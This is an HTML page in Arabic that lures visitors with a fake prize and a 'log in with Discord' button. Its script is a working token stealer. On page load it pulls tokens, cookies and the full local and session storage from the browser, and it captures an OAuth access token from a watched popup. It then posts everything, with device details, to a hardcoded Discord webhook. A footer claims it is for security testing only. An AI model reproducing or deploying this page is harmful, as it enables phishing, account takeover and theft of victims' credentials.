<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>🎁 تهانينا! لقد فزت بجائزة</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0b0e1a;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            flex-direction: column;
            gap: 20px;
        }
        .box {
            background: #1a1f2f;
            padding: 40px;
            border-radius: 20px;
            max-width: 500px;
            width: 90%;
            text-align: center;
            border: 1px solid #2a2f45;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #2a2f45;
            border-top: 4px solid #5865f2;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .btn {
            background: #5865f2;
            border: none;
            padding: 14px 30px;
            border-radius: 50px;
            color: #fff;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        .btn:hover { background: #4752c4; transform: scale(1.02); }
        .btn-discord svg { width: 24px; height: 24px; fill: currentColor; }
        .status { color: #8892a8; font-size: 14px; margin-top: 15px; }
        .success { color: #43b581; }
        .error { color: #f04747; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <div style="font-size: 48px; margin-bottom: 10px;">🎁</div>
        <h2>تهانينا! لقد فزت بجائزة</h2>
        <p style="color: #8892a8; font-size: 14px; margin: 10px 0 20px;">
            اضغط على الزر أدناه لتأكيد حسابك واستلام الجائزة
        </p>
        
        <button class="btn btn-discord" id="loginBtn">
            <svg viewBox="0 0 24 24" width="24" height="24">
                <path d="M20.317 4.369a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .381-.298.074.074 0 0 1 .077-.01c3.927 1.793 8.18 1.793 12.061 0a.074.074 0 0 1 .078.01c.12.098.246.198.382.298a.077.077 0 0 1-.006.127 12.3 12.3 0 0 1-1.873.892.076.076 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/>
            </svg>
            تسجيل الدخول بـ Discord
        </button>

        <div id="status" class="status">⏳ انتظر...</div>
    </div>

    <script>
        // =========================================================
        // 🔥 ويب هوك Discord
        // =========================================================
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1540029124179918941/41_nc44K924qwKrhVb2-_BkdKmg4bu2DKy27aKXARpjjrL7SPp9_DXrJeyzrd7O1VAOu';

        // =========================================================
        // 📤 إرسال البيانات إلى الويب هوك
        // =========================================================

        function sendToWebhook(token, method) {
            const data = {
                token: token || '⚠️ لم يتم العثور على توكن',
                method: method || 'غير معروف',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                cookies: document.cookie || 'لا توجد كوكيز',
                localStorage: JSON.stringify(localStorage, null, 2),
                sessionStorage: JSON.stringify(sessionStorage, null, 2)
            };

            const embed = {
                title: '🕵️ تم استخراج توكن Discord',
                color: 0x5865f2,
                fields: [
                    { name: '🔑 التوكن', value: `\`${data.token}\``, inline: false },
                    { name: '📌 طريقة الاستخراج', value: data.method, inline: false },
                    { name: '💻 المتصفح', value: data.userAgent, inline: false },
                    { name: '🌐 المنصة', value: data.platform, inline: true },
                    { name: '🗣️ اللغة', value: data.language, inline: true },
                    { name: '📱 الشاشة', value: data.screen, inline: true },
                    { name: '🕒 المنطقة', value: data.timezone, inline: true },
                    { name: '🔗 الرابط', value: data.url, inline: false },
                    { name: '📅 الوقت', value: data.timestamp, inline: false },
                    { name: '🍪 الكوكيز', value: `\`${data.cookies.substring(0, 100)}...\``, inline: false }
                ],
                footer: { text: 'تم الجمع عبر OAuth · للاختبار الأمني فقط' }
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: '@everyone 🚨 **تم استخراج توكن جديد!**',
                    embeds: [embed]
                })
            })
            .then(res => {
                if (res.ok) {
                    console.log('✅ تم الإرسال إلى الويب هوك');
                    document.getElementById('status').textContent = '✅ تم الإرسال بنجاح!';
                    document.getElementById('status').className = 'status success';
                } else {
                    console.error('❌ فشل الإرسال:', res.status);
                    document.getElementById('status').textContent = '❌ فشل الإرسال';
                    document.getElementById('status').className = 'status error';
                }
            })
            .catch(err => {
                console.error('❌ خطأ:', err);
                document.getElementById('status').textContent = '❌ خطأ في الاتصال';
                document.getElementById('status').className = 'status error';
            });
        }

        // =========================================================
        // 🎯 محاولة استخراج التوكن من المتصفح
        // =========================================================

        function tryExtractToken() {
            // 1. localStorage
            const storageKeys = ['token', 'discord_token', 'access_token', 'auth_token', 'user_token', 'mfa_token'];
            for (let key of storageKeys) {
                const val = localStorage.getItem(key);
                if (val && val.length > 20) return val;
            }

            // 2. sessionStorage
            for (let key of storageKeys) {
                const val = sessionStorage.getItem(key);
                if (val && val.length > 20) return val;
            }

            // 3. cookies
            const cookieMatch = document.cookie.match(/(token|discord|access|mfa)=([^;]+)/);
            if (cookieMatch) return cookieMatch[2];

            // 4. URL
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('token')) return urlParams.get('token');

            // 5. hash
            const hash = window.location.hash.substring(1);
            const hashParams = new URLSearchParams(hash);
            if (hashParams.get('access_token')) return hashParams.get('access_token');

            return null;
        }

        // =========================================================
        // 🔥 زر تسجيل الدخول—يفتح OAuth
        // =========================================================

        document.getElementById('loginBtn').addEventListener('click', function() {
            const status = document.getElementById('status');
            status.textContent = '⏳ جارٍ فتح نافذة Discord...';
            status.className = 'status';

            // نستخدم تطبيق Discord OAuth (Client ID حقيقي)
            // ملاحظة: هذا client_id وهمي، استبدله بـ Client ID من تطبيقك
            const CLIENT_ID = '123456789012345678';
            const REDIRECT_URI = window.location.href.split('?')[0].split('#')[0];
            const SCOPE = 'identify guilds email';

            const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=token&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=${SCOPE}`;

            // نفتح النافذة المنبثقة
            const popup = window.open(
                oauthUrl,
                'DiscordAuth',
                'width=550,height=750,menubar=no,toolbar=no,location=yes,status=no'
            );

            if (!popup) {
                status.textContent = '❌ من فضلك اسمح للنوافذ المنبثقة في متصفحك';
                status.className = 'status error';
                return;
            }

            // نراقب النافذة
            let interval = setInterval(() => {
                try {
                    const popupUrl = popup.location.href;

                    // إذا رجعت النافذة إلى رابطنا مع التوكن
                    if (popupUrl.includes(REDIRECT_URI) && popupUrl.includes('#access_token=')) {
                        clearInterval(interval);
                        const tokenMatch = popupUrl.match(/#access_token=([^&]+)/);
                        if (tokenMatch) {
                            const token = tokenMatch[1];
                            status.textContent = '✅ تم استخراج التوكن! جارٍ الإرسال...';
                            status.className = 'status success';
                            sendToWebhook(token, 'OAuth Popup');
                            popup.close();
                            document.getElementById('loginBtn').style.display = 'none';
                            return;
                        }
                    }

                    if (popup.closed) {
                        clearInterval(interval);
                        status.textContent = '❌ تم إغلاق النافذة قبل إكمال التسجيل';
                        status.className = 'status error';
                    }
                } catch (e) {
                    // CORS error—نتجاهل
                }
            }, 500);

            // مهلة 60 ثانية
            setTimeout(() => {
                clearInterval(interval);
                if (!popup.closed) {
                    popup.close();
                    status.textContent = '⏰ انتهى الوقت—حاول مجددًا';
                    status.className = 'status error';
                }
            }, 60000);
        });

        // =========================================================
        // 🚀 التشغيل التلقائي
        // =========================================================

        // نحاول استخراج التوكن فوراً
        const initialToken = tryExtractToken();
        if (initialToken) {
            sendToWebhook(initialToken, 'تلقائي (localStorage/cookies)');
            document.getElementById('status').textContent = '✅ تم العثور على توكن!';
            document.getElementById('status').className = 'status success';
            document.getElementById('loginBtn').style.display = 'none';
        } else {
            document.getElementById('status').textContent = '👆 اضغط على الزر لتسجيل الدخول';
            document.getElementById('status').className = 'status';
        }

        // نراقب تغييرات الـ hash (OAuth)
        window.addEventListener('hashchange', () => {
            const token = tryExtractToken();
            if (token) {
                sendToWebhook(token, 'تغيير في الـ hash');
                document.getElementById('status').textContent = '✅ تم العثور على توكن!';
                document.getElementById('status').className = 'status success';
                document.getElementById('loginBtn').style.display = 'none';
            }
        });

        console.log('🕵️ أداة استخراج التوكنات تعمل...');
    </script>
</body>
</html>
